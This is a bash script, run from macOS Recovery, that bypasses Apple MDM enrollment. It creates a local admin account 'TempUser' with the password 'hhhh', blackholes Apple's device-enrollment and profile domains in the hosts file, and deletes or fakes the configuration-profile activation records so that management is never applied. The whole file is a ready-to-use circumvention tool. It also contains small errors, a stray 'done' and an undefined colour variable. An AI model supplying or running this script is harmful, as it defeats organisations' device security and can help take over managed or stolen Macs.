#!/bin/bash

# Define color codes
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Function to get the system volume name
get_system_volume() {
    system_volume=$(ls /Volumes | grep " - Data" | sed 's/ - Data//')
    echo "$system_volume"
}

# Get the system volume name
system_volume=$(get_system_volume)

# Display header
echo -e "${CYAN}Bypass MDM RM5${NC}"
echo ""


# Bypass MDM from Recovery
echo -e "${YEL}Bypass MDM from Recovery"
if [ -d "/Volumes/$system_volume - Data" ]; then
    diskutil rename "$system_volume - Data" "Data"
fi

# Create Temporary User
echo -e "${NC}Create a Temporary User"
realName="${realName:=TempUser}"
username="${username:=TempUser}"
passw="${passw:=hhhh}"

# Create User
dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
echo -e "${GREEN}Creating Temporary User"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "501"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
mkdir "/Volumes/Data/Users/$username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership $username

# Block MDM domains
echo "0.0.0.0 deviceenrollment.apple.com" >>/Volumes/"$system_volume"/etc/hosts
echo "0.0.0.0 mdmenrollment.apple.com" >>/Volumes/"$system_volume"/etc/hosts
echo "0.0.0.0 iprofiles.apple.com" >>/Volumes/"$system_volume"/etc/hosts
echo -e "${GRN}Successfully blocked MDM & Profile Domains"

# Remove configuration profiles
touch /Volumes/Data/private/var/db/.AppleSetupDone
rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound

echo -e "${GRN}MDM enrollment has been bypassed!${NC}"
echo -e "${NC}Rebooting...${NC}"
reboot
done
